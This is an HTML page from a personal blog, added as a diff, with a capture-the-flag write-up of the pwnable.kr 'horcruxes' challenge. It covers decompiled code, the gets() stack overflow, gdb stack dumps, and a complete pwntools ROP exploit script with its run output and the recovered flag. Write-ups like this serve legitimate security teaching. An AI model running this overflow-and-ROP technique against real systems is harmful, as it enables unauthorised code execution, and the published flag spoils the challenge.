@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
+    <style>
+        body{
+            background-color: #44444E;
+            margin: 0;
+        }
+
+        .top-block {
+            width: 100%;
+            height: 70px;
+            background-color: #4C7B8B;
+            position: fixed;
+            box-sizing: border-box;
+            align-items: center;
+        }
+
+        .Welcome{
+            color: #F9F3EF;
+            position: absolute;
+            font-family: Arial;
+            left:740px;
+            top:10px;
+        }
+
+        .Home{
+            transition-duration: 0.4s;
+            border-radius: 0px;
+            font-size:40px;
+            background-color: #44444E;
+            border: 2px solid #44444E;
+            color:#ffffff;
+            font-family: Arial;
+            top:0px;
+            left:0px;
+            position: absolute;
+            padding: 10px 25px;
+        }
+        .Home:hover{
+            border: 2px solid #4C7B8B;
+            background-color: #4C7B8B;
+            color: #44444E;
+            cursor:pointer;
+        }
+
+        .About{
+            transition-duration: 0.4s;
+            border-radius: 0px;
+            font-size:40px;
+            background-color: #4C7B8B;
+            border: 2px solid #4C7B8B;
+            color:#FFFFFF;
+            font-family: Arial;
+            top:0px;
+            left:158px;
+            position: absolute;
+            padding: 10px 25px;
+        }
+        .About:hover{
+            border: 2px solid #ffffff;
+            background-color: #ffffff;
+            color: #4C7B8B;
+            cursor:pointer;
+        }
+
+        .RootLogo{
+            border-radius: 8px;
+            width:75px;
+            right:10px;
+            top:0px;
+            position: absolute;
+        }
+
+        .sidebar {
+            width: 220px;
+            background-color: #715A5A;
+            color: #F9F3EF;
+            position: fixed;
+            top: 70px;
+            left: 0;
+            height: 100%;
+            padding: 15px;
+            overflow-y: auto;
+        }
+
+        .main-content {
+            margin-left: 100px;
+            padding: 90px 20px 20px 240px;
+            color: #F9F3EF;
+        }
+
+        .code-block {
+            background-color: #1E1E1E;
+            color: #F9F3EF;
+            border: 2px solid #4C7B8B;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: monospace;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            max-width: 1100px;
+        }
+
+        .terminal-block {
+            background-color: #0D0D0D;
+            color: #00FF7F;
+            border: 2px solid #4C7B8B;
+            border-radius: 8px;
+            padding: 10px;
+            margin: 15px 0;
+            font-family: monospace;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            max-width: 1100px;
+        }
+    </style>
+    <title>RootBlog</title>
+</head>
+
+<body>
+
+<div class="top-block">
+    <h1 class="Welcome">Welcome To The Root's Blog</h1>
+    <form action="/home" method="get">
+        <button class="Home">Home</button>
+    </form>
+    <form action="/about" method="get">
+        <button class="About">About</button>
+    </form>
+    <img class="RootLogo" src="/static/images/root_logo.png">
+</div>
+
+<div class="sidebar">
+    <details>
+        <summary>Writeup</summary>
+        <ul>
+            <li><a href="#">pwnable.kr - horcruxes</a></li>
+        </ul>
+    </details>
+</div>
+
+<div class="main-content">
+<p style="color:#F9F3EF;"><strong style="color:#7B9AD1;">Description of the challenge:</strong><br>
+<p>Voldemort concealed his splitted soul inside 7 horcruxes.<br>
+Find all horcruxes, and ROP it!<br>
+author: jiwon choi<br>
+
+ssh horcruxes@pwnable.kr -p2222 (pw:guest)</p><br>
+
+<p>In this challenge we have one binary file:<br>
+horcruxes<br>
+So we don't have source code - then we will use ghidra to decompile to understand the code:</p>
+
+
+<div class="code-block">
+<pre>
+<span style="color:#FF9E4A;">void</span> <span style="color:#A351D1;">init_ABCDEFG</span>(<span style="color:#FF9E4A;">void</span>){
+
+  <span style="color:#FF9E4A;">int</span> iVar1;
+  <span style="color:#FF9E4A;">undefined4</span> RandChars;
+  <span style="color:#FF9E4A;">undefined4</span> fd;
+
+  fd <span style="color:#F85828;">=</span> <span style="color:#E2342D;">open</span>(<span style="color:#00FF7F;">"/dev/urandom"</span>,<span style="color:#FF9E4A;">0</span>);
+  iVar1 <span style="color:#F85828;">=</span> <span style="color:#E2342D;">read</span>(fd,<span style="color:#F85828;">&</span>RandChars,<span style="color:#FF9E4A;">4</span>);
+  <span style="color:#4DA6FF;">if</span> (iVar1 <span style="color:#F85828;">!=</span> <span style="color:#FF9E4A;">4</span>) {
+    <span style="color:#E2342D;">puts</span>(<span style="color:#00FF7F;">"/dev/urandom error"</span>);
+    <span style="color:#E2342D;">exit</span>(<span style="color:#FF9E4A;">0</span>);
+  }
+  <span style="color:#E2342D;">close</span>(fd);
+  <span style="color:#E2342D;">srand</span>(RandChars);
+  iVar1 <span style="color:#F85828;">=</span> <span style="color:#E2342D;">rand</span>();
+  a <span style="color:#F85828;">=</span> iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-559038737</span> <span style="color:#F85828;">+</span> (<span style="color:#FF9E4A;">uint</span>)(<span style="color:#FF9E4A;">3405691581</span> <span style="color:#F85828;"><</span> (<span style="color:#FF9E4A;">uint</span>)(iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-559038737</span>)) <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">889275714</span>;
+  iVar1 <span style="color:#F85828;">=</span> <span style="color:#E2342D;">rand</span>();
+  b <span style="color:#F85828;">=</span> iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span> <span style="color:#F85828;">+</span> (<span style="color:#FF9E4A;">uint</span>)(<span style="color:#FF9E4A;">0xcafebabd</span> <span style="color:#F85828;"><</span> (<span style="color:#FF9E4A;">uint</span>)(iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span>)) <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">0x35014542</span>;
+  iVar1 <span style="color:#F85828;">=</span> <span style="color:#E2342D;">rand</span>();
+  c <span style="color:#F85828;">=</span> iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span> <span style="color:#F85828;">+</span> (<span style="color:#FF9E4A;">uint</span>)(<span style="color:#FF9E4A;">0xcafebabd</span> <span style="color:#F85828;"><</span> (<span style="color:#FF9E4A;">uint</span>)(iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span>)) <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">0x35014542</span>;
+  iVar1 <span style="color:#F85828;">=</span> <span style="color:#E2342D;">rand</span>();
+  d <span style="color:#F85828;">=</span> iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span> <span style="color:#F85828;">+</span> (<span style="color:#FF9E4A;">uint</span>)(<span style="color:#FF9E4A;">0xcafebabd</span> <span style="color:#F85828;"><</span> (<span style="color:#FF9E4A;">uint</span>)(iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span>)) <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">0x35014542</span>;
+  iVar1 <span style="color:#F85828;">=</span> <span style="color:#E2342D;">rand</span>();
+  e <span style="color:#F85828;">=</span> iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span> <span style="color:#F85828;">+</span> (<span style="color:#FF9E4A;">uint</span>)(<span style="color:#FF9E4A;">0xcafebabd</span> <span style="color:#F85828;"><</span> (<span style="color:#FF9E4A;">uint</span>)(iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span>)) <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">0x35014542</span>;
+  iVar1 <span style="color:#F85828;">=</span> <span style="color:#E2342D;">rand</span>();
+  f <span style="color:#F85828;">=</span> iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span> <span style="color:#F85828;">+</span> (<span style="color:#FF9E4A;">uint</span>)(<span style="color:#FF9E4A;">0xcafebabd</span> <span style="color:#F85828;"><</span> (<span style="color:#FF9E4A;">uint</span>)(iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span>)) <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">0x35014542</span>;
+  iVar1 <span style="color:#F85828;">=</span> <span style="color:#E2342D;">rand</span>();
+  g <span style="color:#F85828;">=</span> iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span> <span style="color:#F85828;">+</span> (<span style="color:#FF9E4A;">uint</span>)(<span style="color:#FF9E4A;">0xcafebabd</span> <span style="color:#F85828;"><</span> (<span style="color:#FF9E4A;">uint</span>)(iVar1 <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">-0x21524111</span>)) <span style="color:#F85828;">*</span> <span style="color:#FF9E4A;">0x35014542</span>;
+  sum <span style="color:#F85828;">=</span> g <span style="color:#F85828;">+</span> a <span style="color:#F85828;">+</span> b <span style="color:#F85828;">+</span> c <span style="color:#F85828;">+</span> d <span style="color:#F85828;">+</span> e <span style="color:#F85828;">+</span> f;
+  <span style="color:#4DA6FF;">return</span>;
+}
+</pre>
+</div>
+
+<p>We can see init_ABCDEFG() function is initialize random values for each function values.
+    <br>So we can't guess the values - meaning we will have to do smth else.</p>
+
+<div class="code-block">
+<pre>
+<span style="color:#FF9E4A;">undefined4</span> <span style="color:#A351D1;">ropme</span>(<span style="color:#FF9E4A;">void</span>)
+
+{
+  <span style="color:#FF9E4A;">int</span> EXP;
+  <span style="color:#FF9E4A;">undefined1</span> UserInput [<span style="color:#FF9E4A;">100</span>];
+  <span style="color:#FF9E4A;">int</span> MenuOp;
+  <span style="color:#FF9E4A;">undefined4</span> fd;
+
+  <span style="color:#E2342D;">printf</span>(<span style="color:#00FF7F;">"Select Menu:"</span>);
+  <span style="color:#E2342D;">scanf</span>(<span style="color:#F85828;">&</span>DAT_08042151,<span style="color:#F85828;">&</span>MenuOp);
+  <span style="color:#E2342D;">getchar</span>();
+  <span style="color:#4DA6FF;">if</span> (MenuOp <span style="color:#F85828;">==</span> a) {
+    <span style="color:#A351D1;">A</span>();
+  }
+  <span style="color:#4DA6FF;">else if</span> (MenuOp <span style="color:#F85828;">==</span> b) {
+    <span style="color:#A351D1;">B</span>();
+  }
+  <span style="color:#4DA6FF;">else if</span> (MenuOp <span style="color:#F85828;">==</span> c) {
+    <span style="color:#A351D1;">C</span>();
+  }
+  <span style="color:#4DA6FF;">else if</span> (MenuOp <span style="color:#F85828;">==</span> d) {
+    <span style="color:#A351D1;">D</span>();
+  }
+  <span style="color:#4DA6FF;">else if</span> (MenuOp <span style="color:#F85828;">==</span> e) {
+    <span style="color:#A351D1;">E</span>();
+  }
+  <span style="color:#4DA6FF;">else if</span> (MenuOp <span style="color:#F85828;">==</span> f) {
+    <span style="color:#A351D1;">F</span>();
+  }
+  <span style="color:#4DA6FF;">else if</span> (MenuOp <span style="color:#F85828;">==</span> g) {
+    <span style="color:#A351D1;">G</span>();
+  }
+  <span style="color:#4DA6FF;">else</span> {
+    <span style="color:#E2342D;">printf</span>(<span style="color:#00FF7F;">"How many EXP did you earned? : "</span>);
+    <span style="color:#E2342D;">gets</span>(UserInput);
+    EXP <span style="color:#F85828;">=</span> <span style="color:#E2342D;">atoi</span>(UserInput);
+    <span style="color:#4DA6FF;">if</span> (EXP <span style="color:#F85828;">==</span> sum) {
+      fd <span style="color:#F85828;">=</span> <span style="color:#E2342D;">open</span>(<span style="color:#00FF7F;">"/home/horcruxes_pwn/flag"</span>,<span style="color:#FF9E4A;">0</span>);
+      EXP <span style="color:#F85828;">=</span> <span style="color:#E2342D;">read</span>(fd,UserInput,<span style="color:#FF9E4A;">100</span>);
+      UserInput[EXP] <span style="color:#F85828;">=</span> <span style="color:#FF9E4A;">0</span>;
+      <span style="color:#E2342D;">puts</span>(UserInput);
+      <span style="color:#E2342D;">close</span>(fd);
+      <span style="color:#E2342D;">exit</span>(<span style="color:#FF9E4A;">0</span>);
+    }
+    <span style="color:#E2342D;">puts</span>(<span style="color:#00FF7F;">"You'd better get more experience to kill Voldemort"</span>);
+  }
+  <span style="color:#4DA6FF;">return</span> <span style="color:#FF9E4A;">0</span>;
+}
+</pre>
+</div>
+
+<p>
+Seems interesting:
+</p>
+
+<pre>
+  undefined1 UserInput [100];
+  ...
+  gets(UserInput);
+</pre>
+
+<p>
+So we can try stack buffer overflow to write the return address or the other local variables.<br>
+Let's open gdb to check all the functions we need:
+</p>
+
+
+<div><div class="terminal-block">
+0x0804129d  A
+0x080412cf  B
+0x08041301  C
+0x08041333  D
+0x08041365  E
+0x08041397  F
+0x080413c9  G
+0x080413fb  main
+0x0804150b  ropme
+0x08041698  init_ABCDEFG
+</code></div>
+
+<p>
+Right after we call gets and finish it - after inputting 'A' we can see our input and also the return address <span style="color:#F85828;">0x08041501</span> (which is a return address to continue in main after we finish with ropme ) in <span style="color:#F85828;">0xffffdb3c</span>.
+</p>
+
+<div><div class="terminal-block">
+pwndbg&gt; x/100x $esp
+0xffffdab0:	0xffffdac4	0xf7ffcb80	0xffffdb38	0x0804154a
+0xffffdac0:	0x08046280	0x41414141	0x41414141	0x41414141
+0xffffdad0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffdae0:	0x41414141	0x41414141	0x41414141	0xc8004141
+0xffffdaf0:	0x00000000	0xf7ffcb80	0xf7f92e6d	0xf7fb1000
+0xffffdb00:	0x080451a0	0xf7ffcb80	0xffffdb58	0xf7f91c54
+0xffffdb10:	0x080451a0	0x00000000	0xf7fb1000	0x08043f90
+0xffffdb20:	0xf7f91c0b	0x08043f90	0x00000004	0x080414f9
+0xffffdb30:	0x080451a0	0x08043f90	0xffffdb58	<span style="color:#F85828;">0x08041501</span>
+</code></div>
+
+<p>
+We can overwrite it.
+</p>
+
+<div class="code-block">
+<pre>
+<span style="color:#FF9E4A;">void</span> <span style="color:#A351D1;">G</span>(<span style="color:#FF9E4A;">void</span>){
+
+  <span style="color:#E2342D;">printf</span>(<span style="color:#00FF7F;">"You found \"Harry Potter\" (EXP +%d)\n"</span>,g);
+  <span style="color:#4DA6FF;">return</span>;
+}
+</pre>
+</div>
+
+
+<p>
+For example, we can see the function G.<br>
+When there's return it pops the address in the stack - where we can overwrite and control.<br>
+As we saw - we need to enter the sum of all a+b+c+d+e+f+g, but its random so if we call the function we could see for each - we can make a rop chain call, then we return back to ropme function to enter the sum , without initializing. <br>
+Here's the script for the exploit:
+</p>
+
+<div class="code-block">
+<pre>
+<span style="color:#4DA6FF;">from</span> <span style="color:#A351D1;">pwn</span> <span style="color:#4DA6FF;">import</span> *
+
+INT <span style="color:#F85828;">=</span> <span style="color:#FF9E4A;">2</span><span style="color:#F85828;">**</span><span style="color:#FF9E4A;">32</span>
+<span style="color:#6C6C6C;"># context.log_level = 'debug'</span>
+
+s <span style="color:#F85828;">=</span> <span style="color:#E2342D;">ssh</span>(host<span style="color:#F85828;">=</span><span style="color:#00FF7F;">'pwnable.kr'</span>,port<span style="color:#F85828;">=</span><span style="color:#FF9E4A;">2222</span>,user<span style="color:#F85828;">=</span><span style="color:#00FF7F;">'horcruxes'</span>,password<span style="color:#F85828;">=</span><span style="color:#00FF7F;">'guest'</span>)
+
+A <span style="color:#F85828;">=</span> <span style="color:#E2342D;">p32</span>(<span style="color:#FF9E4A;">0x0804129d</span>)
+B <span style="color:#F85828;">=</span> <span style="color:#E2342D;">p32</span>(<span style="color:#FF9E4A;">0x080412cf</span>)
+C <span style="color:#F85828;">=</span> <span style="color:#E2342D;">p32</span>(<span style="color:#FF9E4A;">0x08041301</span>)
+D <span style="color:#F85828;">=</span> <span style="color:#E2342D;">p32</span>(<span style="color:#FF9E4A;">0x08041333</span>)
+E <span style="color:#F85828;">=</span> <span style="color:#E2342D;">p32</span>(<span style="color:#FF9E4A;">0x08041365</span>)
+F <span style="color:#F85828;">=</span> <span style="color:#E2342D;">p32</span>(<span style="color:#FF9E4A;">0x08041397</span>)
+G <span style="color:#F85828;">=</span> <span style="color:#E2342D;">p32</span>(<span style="color:#FF9E4A;">0x080413c9</span>)
+
+ropme_return_addr <span style="color:#F85828;">=</span> <span style="color:#E2342D;">p32</span>(<span style="color:#FF9E4A;">0x0804150b</span>)
+
+payload <span style="color:#F85828;">=</span> <span style="color:#00FF7F;">b'A'</span><span style="color:#F85828;">*</span><span style="color:#FF9E4A;">120</span> <span style="color:#F85828;">+</span> A <span style="color:#F85828;">+</span> B <span style="color:#F85828;">+</span> C <span style="color:#F85828;">+</span> D <span style="color:#F85828;">+</span> E <span style="color:#F85828;">+</span> F <span style="color:#F85828;">+</span> G <span style="color:#F85828;">+</span> ropme_return_addr
+
+p <span style="color:#F85828;">=</span> s.<span style="color:#E2342D;">remote</span>(<span style="color:#00FF7F;">"0"</span>,<span style="color:#FF9E4A;">9032</span>)
+p.<span style="color:#E2342D;">recvuntil</span>(<span style="color:#00FF7F;">b"Select Menu:"</span>)
+p.<span style="color:#E2342D;">sendline</span>(<span style="color:#00FF7F;">b"4"</span>)
+p.<span style="color:#E2342D;">recvuntil</span>(<span style="color:#00FF7F;">b"How many EXP did you earned? :"</span>)
+p.<span style="color:#E2342D;">sendline</span>(payload)
+
+IsNegative <span style="color:#F85828;">=</span> <span style="color:#4DA6FF;">False</span>
+sum <span style="color:#F85828;">=</span> <span style="color:#FF9E4A;">0</span>
+
+<span style="color:#4DA6FF;">for</span> i <span style="color:#4DA6FF;">in</span> <span style="color:#E2342D;">range</span>(<span style="color:#FF9E4A;">7</span>):
+    data <span style="color:#F85828;">=</span> p.<span style="color:#E2342D;">recvuntil</span>(<span style="color:#00FF7F;">b')\n'</span>).<span style="color:#E2342D;">decode</span>()
+    data <span style="color:#F85828;">=</span> data.<span style="color:#E2342D;">split</span>(<span style="color:#00FF7F;">'EXP +'</span>)[<span style="color:#FF9E4A;">1</span>].<span style="color:#E2342D;">split</span>(<span style="color:#00FF7F;">')'</span>)[<span style="color:#FF9E4A;">0</span>]
+    <span style="color:#4DA6FF;">if</span> <span style="color:#00FF7F;">"-"</span> <span style="color:#4DA6FF;">in</span> data :
+        data <span style="color:#F85828;">=</span> data.<span style="color:#E2342D;">split</span>(<span style="color:#00FF7F;">"-"</span>)[<span style="color:#FF9E4A;">1</span>]
+        IsNegative <span style="color:#F85828;">=</span> <span style="color:#4DA6FF;">True</span>
+    num <span style="color:#F85828;">=</span> <span style="color:#E2342D;">int</span>(data)
+    <span style="color:#4DA6FF;">if</span> IsNegative :
+        num <span style="color:#F85828;">=</span> <span style="color:#F85828;">-</span>num
+        IsNegative <span style="color:#F85828;">=</span> <span style="color:#4DA6FF;">False</span>
+    sum <span style="color:#F85828;">+=</span> num
+
+sum <span style="color:#F85828;">=</span> sum <span style="color:#F85828;">%</span> INT
+<span style="color:#4DA6FF;">if</span> sum <span style="color:#F85828;">>=</span> <span style="color:#FF9E4A;">2</span><span style="color:#F85828;">**</span><span style="color:#FF9E4A;">31</span>:
+    sum <span style="color:#F85828;">-=</span> INT
+
+<span style="color:#E2342D;">print</span>(sum)
+
+p.<span style="color:#E2342D;">recvuntil</span>(<span style="color:#00FF7F;">b"Select Menu:"</span>)
+p.<span style="color:#E2342D;">send</span>(<span style="color:#00FF7F;">b"1\n"</span>)
+p.<span style="color:#E2342D;">recvuntil</span>(<span style="color:#00FF7F;">b"How many EXP did you earned? :"</span>)
+p.<span style="color:#E2342D;">sendline</span>(<span style="color:#E2342D;">str</span>(sum).<span style="color:#E2342D;">encode</span>())
+
+flag <span style="color:#F85828;">=</span> p.<span style="color:#E2342D;">recvuntil</span>(<span style="color:#00FF7F;">b'\n'</span>)
+    <span style="color:#E2342D;">print</span>(<span style="color:#00FF7F;">f"flag ============= </span><span style="color:#F85828;">{</span>flag.<span style="color:#E2342D;">decode</span>().<span style="color:#E2342D;">strip</span>()<span style="color:#F85828;">}</span><span style="color:#00FF7F;">"</span>)
+
+p.<span style="color:#E2342D;">interactive</span>()
+</pre>
+</div>
+
+
+<p>
+So when we run our script:
+</p>
+
+<div class="terminal-block">
+$ python3 exploit.py
+[+] Connecting to pwnable.kr on port 2222: Done
+[*] brainfuck@pwnable.kr:
+    Distro    Ubuntu 22.04
+    OS:       linux
+    Arch:     amd64
+    Version:  5.15.0
+    ASLR:     Enabled
+[+] Connecting to 0:9032 via SSH to pwnable.kr: Done
+-1528712340
+flag ============= The_M4gic_sp3l1_is_Avada_Ked4vra
+[*] Switching to interactive mode
+
+[*] Got EOF while reading in interactive
+$
+[*] Interrupted
+[*] Closed remote connection to 0:9032 via SSH connection to pwnable.kr
+</div>
+
+<p>
+And we got our flag:<br>
+<span style="color:#00FF7F;">The_M4gic_sp3l1_is_Avada_Ked4vra</span>
+</p>
+<br>
+
+</div>
+
+</body>
+</html>
